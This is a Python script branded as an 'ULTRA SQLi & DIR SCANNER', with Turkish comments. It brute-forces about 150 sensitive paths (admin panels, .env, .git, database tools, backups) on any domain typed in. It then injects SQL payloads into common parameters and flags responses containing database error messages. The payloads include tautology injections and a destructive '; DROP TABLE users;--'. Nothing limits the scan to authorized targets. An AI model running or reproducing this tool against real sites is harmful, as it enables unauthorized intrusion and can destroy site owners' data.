import requests
import urllib.parse
import concurrent.futures
import time
import os
from colorama import Fore, Style, init

init(autoreset=True)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

# 🎬 ANİMASYONLU AÇILIŞ
def fancy_intro():
    banner = f"""
{Fore.RED}
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔═══╝ 
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║     
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     
{Fore.YELLOW}▶ ULTRA SQLi & DIR SCANNER by {Fore.MAGENTA}XQEY 🐦‍🔥
"""
    for char in banner:
        print(char, end="", flush=True)
        time.sleep(0.002)

# 💥 SQL HATA İMZALARI
SQL_ERRORS = [
    "you have an error in your sql syntax;", "warning: mysql_fetch_array()",
    "mysql_num_rows()", "pg_query(): query failed:", "unterminated quoted string",
    "unclosed quotation mark after the character string",
    "microsoft oledb provider", "sql server native client", "ora-00933",
    "ora-01756", "sqlite error", "unrecognized token", "unexpected end of sql",
    "fatal error", "query failed", "exception occurred", "internal server error",
    "access denied for user", "request blocked by security rule"
]

# 🎯 TARANACAK DİZİNLER (FULL)
DIR_WORDLIST = [
    "admin", "administrator", "adminpanel", "controlpanel", "dashboard", "cms", "system",
    "login", "signin", "auth", "account", "users", "register", "signup", "reset", "forgot", "password",
    "config", "configuration", "env", ".env", "setup", "install", "db", "database", "sql", "mysql",
    "pgsql", "mssql", "oracle", "sqlite", "phpmyadmin", "adminer", "sqladmin", "dbadmin",
    "backup", "backups", "backup_old", "dump", "sql_dump", "archive", "upload", "uploads",
    "files", "media", "docs", "images", "img", "pdf", "tmp", "temp", "logs", "log", "cache", "bin",
    "cgi-bin", "include", "includes", "lib", "libs", "vendor", "static", "themes", "templates", 
    "api", "v1", "v2", "ajax", "service", "services", "endpoint", "gateway", "test", "testing", 
    "dev", "development", "sandbox", "staging", "prod", "production", "private", "confidential", 
    "monitor", "status", "metrics", "health", "stats", "report", "alerts", "billing", "payment",
    "orders", "cart", "checkout", "tracking", "support", "faq", "contact", "about", "info", 
    "terms", "policy", "privacy", "root", "index", "home", "ftp", "webadmin", "cpanel",
    "webmail", "mail", "smtp", "email", "newsletter", "beta", "beta-test", "fileadmin", "clientarea",
    "blog", "news", "posts", "article", "comments", "search", "filter", "lang", "store", "shop", 
    "products", "category", "robots.txt", ".git", ".svn", ".htaccess", ".htpasswd", "build", 
    "releases", "shell", "cmd", "terminal", "console", "exec", "ping", "run"
]

# 💣 SQL TEST PARAMETRELERİ
SQL_TEST_PARAMS = [
    "id", "page", "cat", "category", "search", "query", "user", "login", "name", "order", 
    "product", "item", "view", "article", "news", "post", "pageid", "pid", "ref", "filter", 
    "lang", "sort", "dir", "type"
]

# 🧪 SQL PAYLOADLARI
SQL_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--", 
    "' OR 'a'='a", "\" OR \"a\"=\"a", "'; DROP TABLE users;--"
]

def check_sql_injection(url, param, payload):
    try:
        sep = "&" if "?" in url else "?"
        test_url = f"{url}{sep}{param}={urllib.parse.quote(payload)}"
        r = requests.get(test_url, headers=HEADERS, timeout=6)
        content = r.text.lower()
        for error in SQL_ERRORS:
            if error.lower() in content:
                return True, test_url
        return False, None
    except Exception:
        return False, None

def scan_url(domain, dir_):
    base_url = f"http://{domain}/{dir_}"
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=5)
        if r.status_code != 200:
            print(f"{Fore.RED}[-] Erişilemedi: {base_url}")
            return False, None
    except:
        print(f"{Fore.YELLOW}[!] Timeout/Hata: {base_url}")
        return False, None

    for param in SQL_TEST_PARAMS:
        for payload in SQL_PAYLOADS:
            vulnerable, vuln_url = check_sql_injection(base_url, param, payload)
            if vulnerable:
                print(f"{Fore.LIGHTGREEN_EX}⚠️ SQL Açığı: {vuln_url}")
                return True, vuln_url

    print(f"{Fore.CYAN}[+] Temiz: {base_url}")
    return False, None

def brute_force_sql(domain):
    vulnerable_urls = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(scan_url, domain, dir_): dir_ for dir_ in DIR_WORDLIST}
        for future in concurrent.futures.as_completed(futures):
            vulnerable, vuln_url = future.result()
            if vulnerable:
                vulnerable_urls.append(vuln_url)
    return vulnerable_urls

if __name__ == "__main__":
    fancy_intro()
    hedef = input(f"{Fore.YELLOW}\nHedef domain (örnek: ornek.com): {Fore.RESET}").strip()
    print(f"\n{Fore.LIGHTMAGENTA_EX}🔍 {hedef} için gelişmiş SQLi + Dizin brute force taraması başlatılıyor...\n")
    sonuc = brute_force_sql(hedef)
    print(f"\n{Fore.LIGHTBLUE_EX}--- TARAMA SONUÇLARI ---")
    if sonuc:
        for v in sonuc:
            print(f"{Fore.GREEN}🔓 Açık Bulundu: {v}")
    else:
        print(f"{Fore.LIGHTGREEN_EX}✅ Açık bulunamadı. Sistem güvenli görünüyor.")
